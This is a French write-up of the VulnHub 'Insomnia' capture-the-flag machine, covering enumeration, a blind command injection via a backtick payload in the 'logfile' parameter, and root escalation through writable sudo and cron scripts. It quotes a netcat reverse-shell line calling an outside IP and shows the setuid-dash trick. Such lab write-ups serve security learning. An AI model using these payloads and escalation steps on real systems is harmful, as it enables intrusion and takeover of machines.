# Solution du CTF Insomnia de VulnHub

J'ai eu quelques difficultés sur ce CTF [Insomnia](https://vulnhub.com/entry/insomnia-1,644/) créé par [alienum](https://twitter.com/AL1ENUM). La morale est de faire attention aux moindres détails que les outils nous remontent faute de rater des éléments importants.

```shellsession
$ sudo nmap -p- -sCV -T5 192.168.56.72
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 21:40 CET
Nmap scan report for 192.168.56.72
Host is up (0.00032s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)
|_http-title: Chat
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 08:00:27:4A:84:93 (Oracle VirtualBox virtual NIC)
```

On a donc une appli ce chat sur le serveur web. Cette ci demande un nom d'utilisateur puis on peut ensuite poster des messages. On peut voir nos messages mais il n'y a aucune forme d'interraction avec d'autres entités même fictives.

## DIDNTREADLOL

`Feroxbuster` ne semblait rien trouver de particulier mais c'est parce que le serveur retourne la page d'index par défaut au lieu d'une erreur 404. Une option permet de filtrer sur les résultats comme le fait `ffuf`. Ici j'ai filtré sur le nombre de mots :

```shellsession
$ feroxbuster -u http://192.168.56.72:8080/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt -n -W 216

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.72:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💢  Word Count Filter     │ 216
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       16l      159w     1363c http://192.168.56.72:8080/style.css
200        1l        1w        0c http://192.168.56.72:8080/process.php
200        2l       12w        0c http://192.168.56.72:8080/administration.php
200     1055l     2563w    63486c http://192.168.56.72:8080/chat.txt
[####################] - 27s    37034/37034   0s      found:4       errors:0      
[####################] - 26s    37034/37034   1371/s  http://192.168.56.72:8080/
```

L'appli de chat fait usage de Javascript et de requêtes Ajax. J'ai lancé Wapiti en mode MITM et branché mon navigateur dessus afin qu'il puisse capturer les requêtes HTTP :

```shellsession
$ wapiti -u http://192.168.56.72:8080/ --mitm-port 8080 -v2 --flush-session -m ""
ujson module not found, using json

 ██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗██████╗
 ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║╚════██╗
 ██║ █╗ ██║███████║██████╔╝██║   ██║   ██║ █████╔╝
 ██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║ ╚═══██╗
 ╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║██████╔╝
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═════╝  
Wapiti 3.1.4 (wapiti-scanner.github.io)
Launching MitmProxy on port 8080. Configure your browser to use it, press ctrl+c when you are done.
[+] GET http://192.168.56.72:8080/ (0)
[+] GET http://192.168.56.72:8080/style.css (0)
[+] POST http://192.168.56.72:8080/process.php (0)
        data: function=getState
[+] POST http://192.168.56.72:8080/process.php (0)
        data: function=update&state=1029
[+] POST http://192.168.56.72:8080/process.php (0)
        data: function=send&message=hello%20world%0A&nickname=zozo
[+] POST http://192.168.56.72:8080/process.php (0)
        data: function=update&state=1030
```

En regardant le fichier JS importé dans le code HTML on voit qu'il est mention d'un paramètre `file` non exploité par le site :

```js
var instanse = false;
var state;
var mes;
var file;

function Chat () {
    this.update = updateChat;
    this.send = sendChat;
	this.getState = getStateOfChat;
}

function getStateOfChat(){
	if(!instanse){
		 instanse = true;
		 $.ajax({
			   type: "POST",
			   url: "process.php",
			   data: {  
			   			'function': 'getState',
						'file': file
						},
			   dataType: "json",
			
			   success: function(data){
				   state = data.state;
				   instanse = false;
			   },
			});
	}	 
}

function updateChat(){
	 if(!instanse){
		 instanse = true;
	     $.ajax({
			   type: "POST",
			   url: "process.php",
			   data: {  
			   			'function': 'update',
						'state': state,
						'file': file
						},
			   dataType: "json",
			   success: function(data){
				   if(data.text){
						for (var i = 0; i < data.text.length; i++) {
                            $('#chat-area').append($("<p>"+ data.text[i] +"</p>"));
                        }								  
				   }
				   document.getElementById('chat-area').scrollTop = document.getElementById('chat-area').scrollHeight;
				   instanse = false;
				   state = data.state;
			   },
			});
	 }
	 else {
		 setTimeout(updateChat, 1500);
	 }
}

function sendChat(message, nickname)
{       
    updateChat();
     $.ajax({
		   type: "POST",
		   url: "process.php",
		   data: {  
		   			'function': 'send',
					'message': message,
					'nickname': nickname,
					'file': file
				 },
		   dataType: "json",
		   success: function(data){
			   updateChat();
		   },
		});
}
```

Mais après plusieurs heures à espérer obtenir un directory-traversal ou un write-what-where j'ai laissé tomber.

La page `administration.php` semble attendre quelque chose :

```html
You are not allowed to view : <br>Your activity has been logged
```

J'ai donc brute-forcé un nom de paramètre possible. Ma wordlist habituelle des paramètres les plus fréquents n'ayant rien trouvé je me suis tourné vers la liste de mots `raft` :

```shellsession
$ ffuf -u "http://192.168.56.72:8080/administration.php?FUZZ=/etc/passwd" -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -fs 65 -t 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.72:8080/administration.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 65
________________________________________________

logfile                 [Status: 200, Size: 76, Words: 12, Lines: 3]
:: Progress: [119601/119601] :: Job [1/1] :: 379 req/sec :: Duration: [0:05:44] :: Errors: 0 ::
```

Tenter ensuite de brute-forcer la valeur de ce paramètre `logfile` n'a mené nul part en revanche Wapiti a remarqué une temporisation sur un payload particulier d'exécution de code.

Il y a un bug ici car une erreur réseau a été remontée mais pas la vulnérabilité. Une erreur que je corrigerais prochainement.

```
[¨] GET http://192.168.56.72:8080/administration.php?logfile=a%60sleep%2060%60 (0)
1 requests were skipped due to network issues
```

La vulnérabilité est avérée mais ne se fait qu'en aveugle. C'est toutefois suffisant pour rappatrier un outil et obtenir un reverse-shell avancé.

Voici à titre d'information le code du script `process.php` qui correspondait à l'API du chat :

```php
<?php

$function = $_POST["function"];
$log = [];

switch ($function) {
    case "getState":
        if (file_exists("chat.txt")) {
            $lines = file("chat.txt");
        }
        $log["state"] = count($lines);
        break;

    case "update":
        $state = $_POST["state"];
        if (file_exists("chat.txt")) {
            $lines = file("chat.txt");
        }
        $count = count($lines);
        if ($state == $count) {
            $log["state"] = $state;
            $log["text"] = false;
        } else {
            $text = [];
            $log["state"] = $state + count($lines) - $state;
            foreach ($lines as $line_num => $line) {
                if ($line_num >= $state) {
                    $text[] = $line = str_replace("\n", "", $line);
                }
            }
            $log["text"] = $text;
        }

        break;

    case "send":
        $nickname = htmlentities(strip_tags($_POST["nickname"]));
        $reg_exUrl =
            "/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/\S*)?/";
        $message = htmlentities(strip_tags($_POST["message"]));
        if ($message != "\n") {
            if (preg_match($reg_exUrl, $message, $url)) {
                $message = preg_replace(
                    $reg_exUrl,
                    '<a href="' .
                        $url[0] .
                        '" target="_blank">' .
                        $url[0] .
                        "</a>",
                    $message
                );
            }

            fwrite(
                fopen("chat.txt", "a"),
                "<span>" .
                    $nickname .
                    "</span>" .
                    ($message = str_replace("\n", " ", $message) . "\n")
            );
        }
        break;
}

echo json_encode($log);

?>

```

Effectivement on ne pouvait en aucun cas jouer sur le nom du fichier.

On peut aller lire le flag de l'utilisatrice `julia` :

```shellsession
www-data@insomnia:/home$ cat julia/user.txt 

~~~~~~~~~~~~~\
USER INSOMNIA
~~~~~~~~~~~~~
Flag : [c2e285cb33cecdbeb83d2189e983a8c0]
```

Et on peut exécuter une commande avec ses droits :

```shellsession
www-data@insomnia:/home/julia$ sudo -l
Matching Defaults entries for www-data on insomnia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on insomnia:
    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh
www-data@insomnia:/home/julia$ cat /var/www/html/start.sh
php -S 0.0.0.0:8080
```

Il y a déjà un process en écoute sur ce port. Ce qui nous intéresse ce sont surtout les droits sur le script `start.sh` :

`-rwxrwxrwx 1 root root 20 Dec 21  2020 /var/www/html/start.sh`

## Entracte indésirable

A ce stade je voulais vien sûr modifier le script bash mais le manque d'espace sur la VM bloquait l'édition. Ce sont des choses qui arrivent quand on bourrine un service qui génère plein de lignes de logs.

Pour régler j'ai du monter le fichier VDI de la VM. Je me suis basé sur l'article suivant :

[How to Mount VirtualBox Disk Image (VDI) to Access VM File-System in Ubuntu | UbuntuHandbook](https://ubuntuhandbook.org/index.php/2021/05/mount-virtualbox-vdi-ubuntu/)

D'abord je liste la liste des images virtuelles :

```bash
vboximg-mount --list --verbose
```

Je retrouve le CTF dans ma liste :

```
VM Name:   "Insomnia"
UUID:      656e32f2-c37d-4452-966d-1bf91c54ebfc
Path:      /home/devloop/VirtualBox VMs/Insomnia/Insomnia.vbox

    Image:   Insomnia-disk001.vdi
    UUID:    1553b8dd-b05d-4105-b527-eb0f58a0a8d8
    Path:    /home/devloop/VirtualBox VMs/Insomnia/Insomnia-disk001.vdi
    Format:  vdi
    Size:    1.7G
    State:   created
    Type:    normal
```

Avec ces infos je peux d'abord monter le VDI puis monter l'un des volumes présent à l'intérieur (ici `vol0` correspond à la partition racine) :

```bash
mkdir disks
sudo vboximg-mount --vm Insomnia -i "/home/devloop/VirtualBox VMs/Insomnia/Insomnia-disk001.vdi" --rw --root disks/
sudo mount disks/vol0 /mnt/
# faire le ménage ici
sudo umount /mnt
sudo umount disks
```

L'opération a consisté à supprimer une partie des fichiers de logs.

## Pas le temps pour les flashbacks

On reprend le fil de notre exploitation :

```shellsession
www-data@insomnia:/var/www/html$ cp start.sh start_backup.start
www-data@insomnia:/var/www/html$ echo bash > start.sh 
www-data@insomnia:/var/www/html$ sudo -u julia /bin/bash /var/www/html/start.sh
julia@insomnia:/var/www/html$ id
uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

L'utilisatrice a quelques commandes dans son historique bash. Malheureusement il s'agit plus d'un oubli de l'auteur du CTF q'un indice volontaire :

```shellsession
cd /var/cron
ls
nano chech.sh
export TERM=xterm
nano check.sh
echo "nc -e /bin/bash 10.0.2.13 4444" >> check.sh
exit
```

Ce fichier `check.sh` nous est accessible (et modifiable) mais comment est-il lancé ?

```shellsession
julia@insomnia:/var/cron$ ls -al check.sh 
-rwxrwxrwx 1 root root 153 Dec 21  2020 check.sh
julia@insomnia:/var/cron$ cat check.sh 
#!/bin/bash
status=$(systemctl is-active insomnia.service)
if [ "$status" == "active"  ]; then
   echo "OK"
else
   systemctl start  insomnia.service
fi
julia@insomnia:/var/cron$ cat /etc/systemd/system/insomnia.service 
[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/html
ExecStart=/bin/bash /var/www/html/start.sh

[Install]
WantedBy=multi-user.target
julia@insomnia:/var/cron$ tail -2  /etc/crontab 
*  *    * * *   root    /bin/bash /var/cron/check.sh
#
```

Il est donc exécuté toutes les minutes. On va faire en sorte qu'il mette le droit setuid sur `/usr/bin/dash` :

```shellsession
julia@insomnia:/var/cron$ ls -al /usr/bin/dash
-rwxr-xr-x 1 root root 121464 Jan 17  2019 /usr/bin/dash
julia@insomnia:/var/cron$ echo "chmod 4755 /usr/bin/dash" >> /var/cron/check.sh
julia@insomnia:/var/cron$ ls -al /usr/bin/dash
-rwsr-xr-x 1 root root 121464 Jan 17  2019 /usr/bin/dash
julia@insomnia:/var/cron$ /usr/bin/dash -p
# cd /root
# ls
root.txt
# cat root.txt

~~~~~~~~~~~~~~~\
ROOTED INSOMNIA
~~~~~~~~~~~~~~~
Flag : [c84baebe0faa2fcdc2f1a4a9f6e2fbfc]

by Alienum with <3
```

*Publié le 6 décembre 2022*
